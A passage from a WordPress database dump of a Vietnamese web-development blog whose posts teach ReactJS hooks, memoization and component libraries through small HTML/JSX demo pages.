</script>\n</body>\n\n</html>\n</pre>', 'Demo-Count: 6. use Redux-Toolkit', '', 'publish', 'open', 'open', '', 'react-demo-6-simple-count-with-redux-toolkit', '', '', '2021-06-28 06:00:21', '2021-06-27 23:00:21', '', 0, 'https://duycode.com/?p=1459', 0, 'post', '', 0),
(1477, 1, '2021-07-05 02:00:27', '2021-07-04 19:00:27', '<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>ReactJS</title>\n</head>\n\n<body>\n    <div id=\"app\"></div>\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\n\n    <script type=\"text/babel\">\n        const { useState, useEffect, useReducer } = React;\n\n        //1. Khai báo state\n        const initialUser = {\n            data: {},\n            error: \'\'\n        }\n        //2. Khai báo Reducer\n        const userReducer = (state = initialUser, action) => {\n            switch (action.type) {\n                case \'FETCH_USER_SUCCESS\': {\n                    return {\n                        data: action.data,\n                        error: \'\'\n                    }\n                }\n                case \'FETCH_USER_FAILED\': {\n                    return {\n                        data: {},\n                        error: \'Lỗi: \' + action.error\n                    }\n                }\n                default: return state;\n            }\n        }\n\n        function App(props) {\n            const [userID, setUserID] = useState(1);\n            const [loading, setLoading] = useState(false);\n            //3. Khai báo hook: useReducer\n            const [user, userDispatch] = useReducer(userReducer, initialUser)\n\n            //4. Fake API\n            const apiFakeData = async (id) => {\n                try {\n                    let url = `https://reqres.in/api/users/${id}`;\n                    let response = await fetch(url);\n                    if (response.ok) {\n                        let responseJSON = await response.json();\n                        userDispatch({\n                            type: \'FETCH_USER_SUCCESS\',\n                            data: responseJSON.data,\n                        })\n                    } else {\n                        console.log(\"Lỗi server\");\n                        userDispatch({\n                            type: \'FETCH_USER_FAILED\',\n                            error: response.status,\n                        })\n                    }\n                } catch (error) {\n                    console.log(\"Lỗi kết nối: \", error);\n                    userDispatch({\n                        type: \'FETCH_USER_FAILED\',\n                        error: error.toString()\n                    })\n                } finally {\n                    setLoading(false)\n                }\n            }\n\n            // Giả sử cho setTimeout 500ms để thấy loading...\n            const getUser = (e) => {\n                let id = e.target.value;\n                setUserID(id);\n                setLoading(true);\n                setTimeout(() => {\n                    apiFakeData(id)\n                }, 500);\n            }\n\n            // Khởi động lấy data luôn, rồi lưu lên reducer\n            useEffect(() => {\n                apiFakeData(userID)\n            }, [])\n\n            return (\n                <div>\n                    <input type=\"number\" value={userID} onChange={getUser} />\n                    {loading ? <p>Loading...</p> : <div><p>{user.error}</p><p>{JSON.stringify(user.data, null, 4)}</p></div>}\n                </div>\n            )\n        }\n\n        ReactDOM.render(\n            <App />,\n            document.getElementById(\'app\')\n        );\n    </script>\n</body>\n\n</html>\n</pre>', 'React-GetAPI: 2. StateManager by Reducer and FetchData by Component', '', 'publish', 'open', 'open', '', 'react-getapi-2-statemanager-by-reducer-and-fetchdata-by-component', '', '', '2021-07-05 02:00:27', '2021-07-04 19:00:27', '', 0, 'https://duycode.com/?p=1477', 0, 'post', '', 0),
(1492, 1, '2021-07-21 14:31:14', '2021-07-21 07:31:14', '<h2>1. Giả sử ta có 1 chương trình rất nặng mỗi lần tính toán như sau:</h2>\n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Demo Memoization</title>\n</head>\n\n<body>\n    <script>\n        // Giả sử ta có 1 function chạy rất nặng như sau\n        const expensiveFunction = (number) => {\n            const start = new Date();\n            console.log(\"Start expensiveFunction\", start.getTime());\n            while (new Date() - start < 2000);\n            console.log(\"End expensiveFunction\", new Date().getTime());\n            const square = number * number;\n            return square;\n        }\n\n        console.log(expensiveFunction(2)); // Tính toán trả về 4\n        console.log(expensiveFunction(3)); // Tính toán trả về 9\n        console.log(expensiveFunction(2)); // Vẫn tiếp tục tính toán và trả về 4\n    </script>\n</body>\n\n</html>\n</pre>\n\n<h2>2. Sử dụng kỹ thuật Memoization </h2>\n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Demo Memoization</title>\n</head>\n\n<body>\n    <script>\n        //Dùng kỹ thuật Memoization để lưu những params đã từng được sử dụng và cache => tối ưu hóa những lần run sau\n        const expensiveFunction = (number) => {\n            // Init cache\n            if (!expensiveFunction.cache) {\n                expensiveFunction.cache = {};\n            }\n            // Return cache if found\n            const key = `${number}`;\n            if (expensiveFunction.cache[key]) return expensiveFunction.cache[key];\n\n            // Calculate\n            const start = new Date();\n            console.log(\"Start expensiveFunction\", start.getTime());\n            while (new Date() - start < 2000);\n            console.log(\"End expensiveFunction\", new Date().getTime());\n            const square = number * number;\n\n            // Save to cache\n            expensiveFunction.cache[key] = square;\n            return square;\n        }\n\n        console.log(expensiveFunction(2)); // Tính toán và lưu cache, trả về 4\n        console.log(expensiveFunction(3)); // Tính toán và lưu cache, trả về 9\n        console.log(expensiveFunction(2)); // Lần sau trả về 4 mà không cần tính toán nữa\n    </script>\n</body>\n\n</html>\n</pre>', 'ES6 – Kỹ thuật Memoization', '', 'publish', 'open', 'open', '', 'es6-ky-thuat-memoization', '', '', '2021-07-21 14:31:14', '2021-07-21 07:31:14', '', 0, 'https://duycode.com/?p=1492', 0, 'post', '', 0);
INSERT INTO `duycode_posts` (`ID`, `post_author`, `post_date`, `post_date_gmt`, `post_content`, `post_title`, `post_excerpt`, `post_status`, `comment_status`, `ping_status`, `post_password`, `post_name`, `to_ping`, `pinged`, `post_modified`, `post_modified_gmt`, `post_content_filtered`, `post_parent`, `guid`, `menu_order`, `post_type`, `post_mime_type`, `comment_count`) VALUES
(1497, 1, '2021-05-01 07:03:46', '2021-05-01 00:03:46', '<h2>1. useCallback()</h2>\r\n-- React.memo() vẫn bị render lại trong 1 số trường hợp\r\n-- useCallback() sinh ra để giải quyết nó :3\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <title>ReactJS</title>\r\n</head>\r\n\r\n<body>\r\n    <div id=\"root\"></div>\r\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\r\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\r\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\r\n\r\n    <script type=\"text/babel\">\r\n        const { useState, useCallback, memo } = React;\r\n\r\n        function App() {\r\n            const [count, setCount] = useState(0);\r\n            const handleHeader = () => { }\r\n\r\n            // dependencies của useCallback giống với useEffect()\r\n            // []: chạy lần đầu render\r\n            // null: luôn luôn chạy\r\n            // [x,y]: chạy khi biến x,y thay đổi\r\n            const handleFooter = useCallback(\r\n                () => {},\r\n                [],\r\n            )\r\n            \r\n            return (\r\n                <div>\r\n                    <Header1 handleHeader={handleHeader} />\r\n                    <MemoHeader2 handleHeader={handleHeader} />\r\n                    <MemoFooter handleFooter={handleFooter} />\r\n                    <p>Current: {count}</p>\r\n                    <button onClick={() => { setCount(count + 1) }}>Increase</button><br />\r\n                </div>\r\n            )\r\n        }\r\n\r\n        // Mỗi lần App re-render ==> đương nhiên Header cũng bị re-render theo\r\n        const Header1 = (props) => {\r\n            console.log(\"Header1 render\");\r\n            return <p>Header1</p>\r\n        }\r\n\r\n        // Mỗi lần App re-render ==> Header2 cũng bị re-render theo mặc dù đã dùng React.memo()\r\n        // Lý do: mỗi lần App re-render thì props.handleHeader đã hiểu là 1 biến khác => nên React.memo() không có tác dụng\r\n        const Header2 = (props) => {\r\n            console.log(\"Header2 render\");\r\n            return <p>Header2</p>\r\n        }\r\n        const MemoHeader2 = React.memo(Header2);\r\n\r\n        // Khi sử dụng useCallback(), props.handleFooter không thay đổi địa chỉ, vẫn hiểu là biến cũ\r\n        // Như vậy: props không thay đổi + dùng memo ==> Component không bị re-render\r\n        const Footer = (props) => {\r\n            console.log(\"Footer render\");\r\n            return <p>Footer</p>\r\n        }\r\n        const MemoFooter = React.memo(Footer);\r\n\r\n\r\n        ReactDOM.render(\r\n            <App />,\r\n            document.getElementById(\'root\')\r\n        );\r\n\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>\r\n\r\n<h2>2. Ví dụ trường hợp Call API </h2>\r\n<h3>1. Khi không có useCallback()</h3>\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <title>ReactJS</title>\r\n</head>\r\n\r\n<body>\r\n    <div id=\"app\"></div>\r\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\r\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\r\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\r\n\r\n    <script type=\"text/babel\">\r\n        const { useState, useEffect, useCallback } = React;\r\n\r\n        function App(props) {\r\n            const [count, setCount] = useState(0);\r\n\r\n            //1. Mỗi lần click Count++ => App render lại\r\n            // ==> tạo ra 1 biến getFakeData khác nhau\r\n            const getFakeData = (type) => {\r\n                return `https://reqres.in/api/${type}`\r\n            }\r\n\r\n            return (\r\n                <div>\r\n                    <button onClick={() => { setCount(count + 1) }}>Count++</button>\r\n                    <p>Count: {count}</p>\r\n\r\n                    <Content getFakeData={getFakeData} />\r\n                </div>\r\n            )\r\n        }\r\n\r\n        function Content({ getFakeData }) {\r\n            const [users, setUsers] = useState([]);\r\n            const [loading, setLoading] = useState(false)\r\n\r\n            //2. getFakeData là 1 props, đã bị thay đổi sau mỗi lần App render\r\n            // Vì thế cả đoạn dưới đây đều bị thay đổi theo (theo tính chất useEffect)\r\n            useEffect(() => {\r\n                setLoading(true);\r\n                setTimeout(() => {\r\n                    let url = getFakeData(\'users\')\r\n                    fetch(url)\r\n                        .then(res => res.json())\r\n                        .then(res => {\r\n                            setUsers(res.data)\r\n                        })\r\n                        .catch(err => {\r\n                            console.log(err);\r\n                        })\r\n                        .finally(() => {\r\n                            setLoading(false);\r\n                        })\r\n                }, 1000);\r\n            }, [getFakeData])\r\n\r\n            return (<div>{loading == true ? <p>Loading...</p> : <p>{JSON.stringify(users)}</p>}</div>)\r\n        }\r\n\r\n        ReactDOM.render(\r\n            <App />,\r\n            document.getElementById(\'app\')\r\n        );\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>\r\n\r\n<h3>Khi sử dụng useCallback()</h3>\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <title>ReactJS</title>\r\n</head>\r\n\r\n<body>\r\n    <div id=\"app\"></div>\r\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\r\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\r\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\r\n\r\n    <script type=\"text/babel\">\r\n        const { useState, useEffect, useCallback } = React;\r\n\r\n        function App(props) {\r\n            const [count, setCount] = useState(0);\r\n\r\n            //1. Mỗi lần click Count++ => App render lại\r\n            // Khi dùng useCallback ==> getFakeData không thay đổi địa chỉ\r\n            const getFakeData = useCallback(\r\n                (type) => {\r\n                    return `https://reqres.in/api/${type}`\r\n                }, []\r\n            )\r\n\r\n\r\n            return (\r\n                <div>\r\n                    <button onClick={() => { setCount(count + 1) }}>Count++</button>\r\n                    <p>Count: {count}</p>\r\n\r\n                    <Content getFakeData={getFakeData} />\r\n                </div>\r\n            )\r\n        }\r\n\r\n        function Content({ getFakeData }) {\r\n            const [users, setUsers] = useState([]);\r\n            const [loading, setLoading] = useState(false)\r\n\r\n            console.log(getFakeData);\r\n            //2. getFakeData là 1 props, không thay đổi sau mỗi lần App render (do dùng useCallback)\r\n            // Vì thế cả đoạn dưới đây không hề bị run lại\r\n            useEffect(() => {\r\n                setLoading(true);\r\n                setTimeout(() => {\r\n                    let url = getFakeData(\'users\')\r\n                    fetch(url)\r\n                        .then(res => res.json())\r\n                        .then(res => {\r\n                            setUsers(res.data)\r\n                        })\r\n                        .catch(err => {\r\n                            console.log(err);\r\n                        })\r\n                        .finally(() => {\r\n                            setLoading(false);\r\n                        })\r\n                }, 1000);\r\n            }, [getFakeData])\r\n\r\n            return (<div>{loading == true ? <p>Loading...</p> : <p>{JSON.stringify(users)}</p>}</div>)\r\n        }\r\n\r\n        ReactDOM.render(\r\n            <App />,\r\n            document.getElementById(\'app\')\r\n        );\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>', 'ReactJS – 7.3. Kỹ thuật Memoization:  useCallback()', '', 'publish', 'open', 'open', '', 'reactjs-7-3-ky-thuat-memoization-usecallback', '', '', '2022-05-20 11:15:52', '2022-05-20 04:15:52', '', 0, 'https://duycode.com/?p=1497', 0, 'post', '', 0),
(1513, 1, '2021-07-22 20:27:33', '2021-07-22 13:27:33', 'Ngoài 2 ông tổ ngành Ant Design và Material UI ra thì có:\r\n- Tailwindcss\r\n- ChakraUI: Chắc chắn rồi anh UI này đang rất hot kết hợp với Tailwind thì bá cháy\r\n- React Bootstrap\r\n- Prime React: Cùng sinh thời với 2 ông tổ ngành\r\n- SemanticUI\r\n- FluentUI: Phong cách Microsoft nhất là anh rồi\r\n- Core UI\r\n- Blueprint: Cùng sinh thời với 2 ông tổ ngành, woa nhiều component quá độc lạ\r\n- Hands UI (A Pure Framework make by every one)\r\n- Element UI\r\n- Aha UI\r\n- Mantine UI: Một cái tên rất rất lạ nhưng các component quá đẹp quá phân vân cho dự án tiếp\r\n- Carbon Design System\r\n- Ionic Framework\r\n- Shopify Polaris\r\n- Atlaskit\r\n- RSuite\r\n- Shoelace\r\n\r\n- Elasticsearch à nhầm ElasticUI: Quá nhiều component đẹp và chỉ mới được open-source thời gian gần\r\n- RingUI: Dành cho các fan dùng WebStorm nếu ElasticUI 10 điểm thì RingUI không thể nhỏ hơn 9\r\n\r\n- SuiteUI: Chị em với Ant Design nhưng khác cha lẫn mẹ\r\n- Geist: Vercel dashboard đang dùng\r\n- ElementUI: Đây là bộ UI khá nổi tiếng cho Vue.js được port sang React chắc chắn sẽ thích\r\nNgoài ra Evergreen, Bumbag, ...vv có gì sai ae bổ sung', 'UI Component Libraries for ReactJS - 2021', '', 'publish', 'open', 'open', '', 'ui-component-libraries-for-reactjs-2021', '', '', '2022-08-07 00:05:37', '2022-08-07 00:05:37', '', 0, 'https://duycode.com/?p=1513', 0, 'post', '', 0),
(1519, 1, '2021-05-01 04:00:51', '2021-04-30 21:00:51', '<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\" />\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\r\n    <title>ReactJS</title>\r\n</head>\r\n\r\n<body>\r\n    <div id=\"app\"></div>\r\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\r\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\r\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\r\n\r\n    <script type=\"text/babel\">\r\n        const { useState, useContext, createContext } = React\r\n\r\n        //Khởi tạo Context, với giá trị mặc định là \"default-value\"\r\n        const MyContext = createContext(\'default-value\')\r\n\r\n        //Component không được bọc trong \'MyContext\' chỉ có thể sử dụng giá trị mặc định\r\n        const Header = () => {\r\n            const context = useContext(MyContext)\r\n            return <h3>Header: {context}</h3>\r\n        }\r\n\r\n        // Component được bọc trong \'Provider\' thì sử dụng useContext\r\n        const Main = () => {\r\n            const { number, setNumber } = useContext(MyContext)\r\n            return (\r\n                <div>\r\n                    <h3>Main Number: {number}</h3>\r\n                    <button onClick={() => setNumber(number + 1)}>Number++</button>\r\n                </div>\r\n            )\r\n        }\r\n\r\n        // Component được bọc trong \'Consumer\' thì sử dụng như Props\r\n        const Footer = ({ context }) => {\r\n            return (\r\n                <div>\r\n                    <h3>Footer Number {context.number}</h3>\r\n                    <button onClick={() => context.setNumber(context.number + 1)}>Number++</button>\r\n                </div>\r\n            )\r\n        }\r\n\r\n        const App = () => {\r\n            const [number, setNumber] = useState(1)\r\n            return (\r\n                <div>\r\n                    <Header /> {/* Khi không có Provider bên ngoài sẽ chỉ nhận giá trị context mặc định */}\r\n                    <MyContext.Provider value={{ number, setNumber }}>\r\n                        {/* Component con cháu bên trong Provider đều nhận được context thông qua useContext */}\r\n                        <Main />\r\n\r\n                        {/* Khi dùng consumer thì bên trong nó là: Function as Child Component */}\r\n                        {/* Nghĩa là dùng context như một props luôn */}\r\n                        <MyContext.Consumer>\r\n                            {({ number, setNumber }) => <Footer context={{ number, setNumber }} />}\r\n                        </MyContext.Consumer>\r\n                    </MyContext.Provider>\r\n                </div>\r\n            )\r\n        }\r\n\r\n        ReactDOM.render(<App />, document.getElementById(\'app\'))\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>', 'ReactJS – 4. useContext: createContext, Provider, Consumer', '', 'publish', 'open', 'open', '', 'reactjs-4-usecontext-createcontext-provider-consumer', '', '', '2022-08-05 08:08:41', '2022-08-05 08:08:41', '', 0, 'https://duycode.com/?p=1519', 0, 'post', '', 0),
(1532, 1, '2021-05-01 02:00:56', '2021-04-30 19:00:56', '<h2>1. Sử dụng Hook</h2>\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <title>ReactJS</title>\r\n</head>\r\n\r\n<body>\r\n    <div id=\"root\"></div>\r\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\r\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\r\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\r\n\r\n    <script type=\"text/babel\">\r\n        const { useState } = React;\r\n\r\n        const App = (props) => {\r\n            const [count, setCount] = useState(0)\r\n            return (\r\n                <div>\r\n                    <h3>{ props.title }</h3>\r\n                    <p>Count: { count }</p>\r\n                    <button onClick={() => { setCount(count + 1) }}>Increase</button>\r\n                    <button onClick={() => { setCount(count - 1) }}>Decrease</button>\r\n                </div>\r\n            );\r\n        }\r\n\r\n        ReactDOM.render(\r\n            <App title=\"Hook - Demo state and prop\" />,\r\n            document.getElementById(\'root\')\r\n        );\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>\r\n\r\n<h2>2. Sử dụng Class</h2>\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <title>ReactJS</title>\r\n</head>\r\n\r\n<body>\r\n    <div id=\"root\"></div>\r\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\r\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\r\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\r\n\r\n    <script type=\"text/babel\">\r\n        class App extends React.Component {\r\n            constructor(props) {\r\n                super(props);\r\n                this.state = { count: 1 }\r\n            };\r\n\r\n            render() {\r\n                return (\r\n                    <div>\r\n                        <h3>{ this.props.title }</h3>\r\n                        <p>Count: { this.state.count }</p>\r\n                        <button onClick={() => { this.setState({ count: this.state.count + 1 }) }}>Decrease</button>\r\n                        <button onClick={() => { this.setState({ count: this.state.count - 1 }) }}>Decrease</button>\r\n                    </div>\r\n                );\r\n            }\r\n        }\r\n\r\n        ReactDOM.render(\r\n            <App title=\"Class Component - Demo state and props\"/>,\r\n            document.getElementById(\'root\')\r\n        );\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>', 'ReactJS - 2: Props và State', '', 'publish', 'open', 'open', '', 'reactjs-2-props-va-state', '', '', '2022-05-20 09:24:38', '2022-05-20 02:24:38', '', 0, 'https://duycode.com/?p=1532', 0, 'post', '', 0),
(1536, 1, '2021-05-01 03:00:48', '2021-04-30 20:00:48', '- Sử dụng khi một component có rất nhiều state.\r\n- Các state này nếu cùng thay đổi trạng thái vào 1 thời điểm thì chỉ cần 1 lần render duy nhất\r\n- Mô hình này quản lý giống hệt Redux\r\n\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <title>ReactJS</title>\r\n</head>\r\n\r\n<body>\r\n    <div id=\"app\"></div>\r\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\r\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\r\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\r\n\r\n    <script type=\"text/babel\">\r\n        const { useReducer } = React;\r\n\r\n        //1. Khai báo state\r\n        const initialState = { now: 0, loading: false }\r\n        //2. Khai báo Reducer\r\n        const nowReducer = (state = initialState, action) => {\r\n            switch (action.type) {\r\n                case \'FETCH_INIT\': {\r\n                    return {\r\n                        ...state,\r\n                        loading: true,\r\n                        now: \'Loading...\',\r\n                    }\r\n                }\r\n                case \'FETCH_SUCCESS\': {\r\n                    return {\r\n                        ...state,\r\n                        loading: false,\r\n                        now: action.payload,\r\n                    }\r\n                }\r\n                case \'FETCH_FAILURE\': {\r\n                    return {\r\n                        ...state,\r\n                        loading: false,\r\n                        now: \"Error !!!\",\r\n                    }\r\n                }\r\n                default: return state;\r\n            }\r\n        }\r\n\r\n        //3. Khai báo action\r\n        const action_init = () => ({\r\n            type: \'FETCH_INIT\',\r\n        })\r\n        const action_success = (now) => ({\r\n            type: \'FETCH_SUCCESS\',\r\n            payload: now,\r\n        })\r\n        const action_failure = (now) => ({\r\n            type: \'FETCH_FAILURE\',\r\n            payload: now,\r\n        })\r\n\r\n        //4. Sử dụng tại Componet => dùng useReducer để lấy state, và dùng dispatch để action\r\n        function App(props) {\r\n            const [state, dispatch] = useReducer(nowReducer, initialState)\r\n\r\n            const fakePromise = () => new Promise((resolve, reject) => {\r\n                setTimeout(() => {\r\n                    let now = (new Date()).getTime();\r\n                    if (now % 2) resolve(now);\r\n                    else reject(now);\r\n                }, 500);\r\n            })\r\n\r\n            const getTime = () => {\r\n                dispatch(action_init())\r\n                fakePromise()\r\n                    .then(res => dispatch(action_success(res)))\r\n                    .catch(err => dispatch(action_failure(err)))\r\n            }\r\n\r\n            return (\r\n                <div>\r\n                    <p>{state.now}{state.loading && <img src=\"https://vcdn-ione.vnecdn.net/2016/07/13/loading-256-0001-4566-1468383063.gif\" width=\"12px\" />}</p>\r\n                    <button onClick={getTime}>Get Time</button>\r\n                </div>\r\n            )\r\n        }\r\n\r\n        ReactDOM.render(\r\n            <App />,\r\n            document.getElementById(\'app\')\r\n        );\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>', 'ReactJS - 3. useReducer', '', 'publish', 'open', 'open', '', 'reactjs-3-usereducer', '', '', '2022-05-20 09:24:09', '2022-05-20 02:24:09', '', 0, 'https://duycode.com/?p=1536', 0, 'post', '', 0),
(1538, 1, '2021-05-01 07:02:39', '2021-05-01 00:02:39', '<h2>1. Giả sử có 1 chương trình rất nặng như sau</h2>\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <title>ReactJS</title>\r\n</head>\r\n\r\n<body>\r\n    <div id=\"app\"></div>\r\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\r\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\r\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\r\n\r\n    <script type=\"text/babel\">\r\n        const { useState, useEffect, useMemo } = React;\r\n\r\n        // Mình giả sử có 1 function rất nặng cần khởi chạy như sau\r\n        const expensiveFunction = (number) => {\r\n            const start = new Date();\r\n            console.log(\"Start expensiveFunction\", start.getTime());\r\n            while (new Date() - start < 500);\r\n            console.log(\"End expensiveFunction\", new Date().getTime());\r\n            return number * 2;\r\n        }\r\n\r\n        function App(props) {\r\n            const [count, setCount] = useState(0);\r\n            const [number, setNumber] = useState(0)\r\n\r\n            // Như vậy, mỗi lần re-render lại, expensiveFunction lại tiếp tục chạy lại\r\n            const square_number = expensiveFunction(number);\r\n\r\n            // Và ta đã thấy, chương trình nặng khủng khiếp.\r\n            // Khi thay đổi giá trị count (mặc dù ko liên quan) ==> vẫn phải run lại hàm expensiveFunction\r\n            return (\r\n                <div>\r\n                    <p>Count: {count}</p>\r\n                    <button onClick={() => { setCount(count + 1) }}>Increase Count</button>\r\n                    <p>Count: {number}</p>\r\n                    <p>Square_number: {square_number}</p>\r\n                    <button onClick={() => { setNumber(number + 1) }}>Increase Number</button>\r\n                </div>\r\n            )\r\n        }\r\n\r\n        ReactDOM.render(\r\n            <App />,\r\n            document.getElementById(\'app\')\r\n        );\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>\r\n\r\n<h2>2. Sử dụng useMemo()</h2>\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <title>ReactJS</title>\r\n</head>\r\n\r\n<body>\r\n    <div id=\"app\"></div>\r\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\r\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\r\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\r\n\r\n    <script type=\"text/babel\">\r\n        const { useState, useEffect, useMemo } = React;\r\n\r\n        // Mình giả sử có 1 function rất nặng cần khởi chạy như sau\r\n        const expensiveFunction = (number) => {\r\n            const start = new Date();\r\n            console.log(\"Start expensiveFunction\", start.getTime());\r\n            while (new Date() - start < 500);\r\n            console.log(\"End expensiveFunction\", new Date().getTime());\r\n            return number * 2;\r\n        }\r\n\r\n        function App(props) {\r\n            const [count, setCount] = useState(0);\r\n            const [number, setNumber] = useState(0);\r\n\r\n            // Khi dùng useMemo ==> square_number chỉ phải lại hàm expensiveFunction(number) khi [number] có sự thay đổi\r\n            const square_number = useMemo(\r\n                () => expensiveFunction(number),\r\n                [number]\r\n            );\r\n\r\n            // Khi thay đổi giá trị count (giá trị ko liên quan) ==> chương trình chạy rất ngon\r\n            // Chỉ khi thay đổi giá trị number ==> mới cần phải run lại hàm expensiveFunction ==> lúc này chương trình mới nặng trở lại\r\n            return (\r\n                <div>\r\n                    <p>Count: {count}</p>\r\n                    <button onClick={() => { setCount(count + 1) }}>Increase Count</button>\r\n                    <p>Count: {number}</p>\r\n                    <p>Square_number: {square_number}</p>\r\n                    <button onClick={() => { setNumber(number + 1) }}>Increase Number</button>\r\n                </div>\r\n            )\r\n        }\r\n\r\n        ReactDOM.render(\r\n            <App />,\r\n            document.getElementById(\'app\')\r\n        );\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>', 'ReactJS – 7.2. Kỹ thuật Memoization: useMemo()', '', 'publish', 'open', 'open', '', 'reactjs-7-2-ky-thuat-memoization-usememo', '', '', '2022-05-20 10:56:42', '2022-05-20 03:56:42', '', 0, 'https://duycode.com/?p=1538', 0, 'post', '', 0),
